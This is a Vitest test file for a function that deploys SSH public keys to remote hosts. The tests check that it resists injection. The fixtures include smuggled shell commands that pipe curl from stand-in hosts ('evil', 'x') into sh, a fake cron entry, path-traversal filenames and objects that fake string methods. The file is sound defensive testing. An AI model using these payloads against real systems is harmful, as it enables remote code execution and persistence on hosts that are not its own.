import { describe, expect, it, vi, beforeEach } from "vitest";
import { addKeyToHost, DEFAULT_EXPORT_SCRIPT } from "./keyExport";

const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";

const ensurePublicKey = vi.fn(async (..._a: unknown[]): Promise<string | null> => `${PUB_KEY}\n`);
const sshExecCommand = vi.fn(async (..._a: unknown[]) => ({ stdout: "", stderr: "", exit_code: 0 }));
const resolveConnectionCredentials = vi.fn(async (..._a: unknown[]) => ({
  username: "root", password: undefined, privateKey: "pk", passphrase: undefined,
}));

vi.mock("@/services/publicKeyStore", () => ({
  ensurePublicKey: (...a: unknown[]) => ensurePublicKey(...a),
}));
vi.mock("@/services/ssh", () => ({ sshExecCommand: (...a: unknown[]) => sshExecCommand(...a) }));
vi.mock("@/services/credentials", () => ({
  resolveConnectionCredentials: (...a: unknown[]) => resolveConnectionCredentials(...a),
}));

const sshKey = { id: "k1", name: "laptop" } as any;
const connection = { id: "c1", host: "example.test", port: 22 } as any;

beforeEach(() => vi.clearAllMocks());

describe("addKeyToHost", () => {
  it("goes through the store, so a key imported private-only still deploys", async () => {
    await addKeyToHost({ sshKey, connection });
    expect(ensurePublicKey).toHaveBeenCalledWith(sshKey);
  });

  it("defaults to .ssh/authorized_keys", async () => {
    await addKeyToHost({ sshKey, connection });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    expect(command).toContain("'.ssh'");
    expect(command).toContain("'authorized_keys'");
  });

  it("uses the default script when none is given", async () => {
    await addKeyToHost({ sshKey, connection });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    expect(command).toContain(DEFAULT_EXPORT_SCRIPT);
  });

  it("uses a caller-supplied script instead", async () => {
    await addKeyToHost({ sshKey, connection, script: "echo hi" });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    expect(command).toContain("echo hi");
    expect(command).not.toContain(DEFAULT_EXPORT_SCRIPT);
  });

  it("sends the connection's resolved credentials, host and port", async () => {
    await addKeyToHost({ sshKey, connection });
    expect(sshExecCommand).toHaveBeenCalledWith(expect.objectContaining({
      host: "example.test", port: 22, username: "root", privateKey: "pk",
    }));
  });

  it("throws when the public key is missing and cannot be derived", async () => {
    ensurePublicKey.mockResolvedValueOnce(null);
    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("throws and names the stderr when the remote command exits non-zero", async () => {
    sshExecCommand.mockResolvedValueOnce({ stdout: "", stderr: "  permission denied  \n", exit_code: 1 } as never);
    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow(/permission denied/);
  });

  it("resolves when the remote command exits zero", async () => {
    sshExecCommand.mockResolvedValueOnce({ stdout: "", stderr: "", exit_code: 0 } as never);
    await expect(addKeyToHost({ sshKey, connection })).resolves.toBeUndefined();
  });

  it("throws when the remote never reports an exit status", async () => {
    sshExecCommand.mockResolvedValueOnce({ stdout: "", stderr: "", exit_code: null } as never);
    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
  });

  it("refuses a location carrying shell metacharacters outright", async () => {
    await expect(addKeyToHost({ sshKey, connection, location: ".ssh'; curl http://x/p | sh; echo '" }))
      .rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("neutralises a single quote in the key name instead of letting it close the shell string", async () => {
    // The name is free text, so shellQuote is what keeps it one argument.
    const quoted = { id: "k1", name: "it'; curl http://x/p | sh; echo '" } as any;
    await addKeyToHost({ sshKey: quoted, connection });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    // Each embedded quote is escaped (close-quote, escaped quote, reopen-quote)
    // rather than closing the argument, so the whole payload stays inside one
    // shell-quoted string instead of becoming a second command.
    expect(command).toContain("'# it'\\''; curl http://x/p | sh; echo '\\'' Key by Voltius'");
  });

  it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
    ensurePublicKey.mockResolvedValueOnce(`${PUB_KEY}\nssh-ed25519 AAAAB3attacker`);
    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("strips a newline from the key name so it can't smuggle a second authorized_keys line", async () => {
    const injectedKey = { id: "k1", name: "x\nssh-ed25519 AAAA…attacker" } as any;
    await addKeyToHost({ sshKey: injectedKey, connection });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    expect(command).toContain("'# x ssh-ed25519 AAAA…attacker Key by Voltius'");
    expect(command).not.toMatch(/# x\nssh-ed25519/);
  });

  it("throws on a public key that is not one, so it cannot be written to the remote file", async () => {
    // key_add_to_host's script supplies the line break itself, so one line of
    // attacker-chosen content is a working cron entry or shell rc line.
    ensurePublicKey.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh");
    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("refuses an absolute or escaping location, whichever caller asked for it", async () => {
    // The MCP schema is not the boundary: api.keys.addToHost passes location and
    // filename straight through, so the service has to hold.
    for (const location of ["/etc/cron.d", "/", ".", "..", ".ssh/../../etc"]) {
      await expect(addKeyToHost({ sshKey, connection, location })).rejects.toThrow();
    }
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("refuses a filename carrying a path separator", async () => {
    await expect(addKeyToHost({ sshKey, connection, filename: "../../etc/cron.d/x" })).rejects.toThrow();
    await expect(addKeyToHost({ sshKey, connection, filename: "sub/keys" })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("refuses a non-string location or filename that fakes the string methods", async () => {
    // Plugins run in-process and are handed the API object itself, so the
    // TypeScript signature is not a runtime guarantee: this object satisfies
    // startsWith/split/includes and would reach shellQuote, which would then
    // call its own `replace` and inject a second command.
    const hostileLocation = {
      startsWith: () => false,
      split: () => ["ssh"],
      includes: () => false,
      replace: () => "'; curl http://evil | sh; echo '",
    } as unknown as string;
    await expect(addKeyToHost({ sshKey, connection, location: hostileLocation })).rejects.toThrow();
    await expect(addKeyToHost({ sshKey, connection, filename: hostileLocation })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("stringifies a hostile key name instead of calling its own replace", async () => {
    const hostileName = { replace: () => "'; curl http://evil | sh; echo '", toString: () => "plain" };
    await addKeyToHost({ sshKey: { id: "k1", name: hostileName } as any, connection });
    const { command } = sshExecCommand.mock.calls[0][0] as any;
    expect(command).toContain("'# plain Key by Voltius'");
    expect(command).not.toContain("curl http://evil");
  });

  it("refuses a backslash in the path and a filename sshd itself interprets", async () => {
    await expect(addKeyToHost({ sshKey, connection, location: "..\\..\\rc" })).rejects.toThrow();
    // ~/.ssh/rc and ~/.ssh/environment are read by sshd at login. The comment
    // charset is what makes an append inert; this is the tripwire around it.
    await expect(addKeyToHost({ sshKey, connection, filename: "rc" })).rejects.toThrow();
    await expect(addKeyToHost({ sshKey, connection, filename: "environment" })).rejects.toThrow();
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("still accepts the panel's own defaults and a nested relative location", async () => {
    await addKeyToHost({ sshKey, connection, location: ".ssh", filename: "authorized_keys" });
    await addKeyToHost({ sshKey, connection, location: ".ssh/keys.d", filename: "voltius" });
    expect(sshExecCommand).toHaveBeenCalledTimes(2);
  });

  it("quotes $1 in the default script so a glob in location is not expanded", () => {
    expect(DEFAULT_EXPORT_SCRIPT).toContain('test ! -e "$1"');
    expect(DEFAULT_EXPORT_SCRIPT).toContain('mkdir -p "$1"');
    expect(DEFAULT_EXPORT_SCRIPT).not.toMatch(/-[ep] \$1/);
  });
});
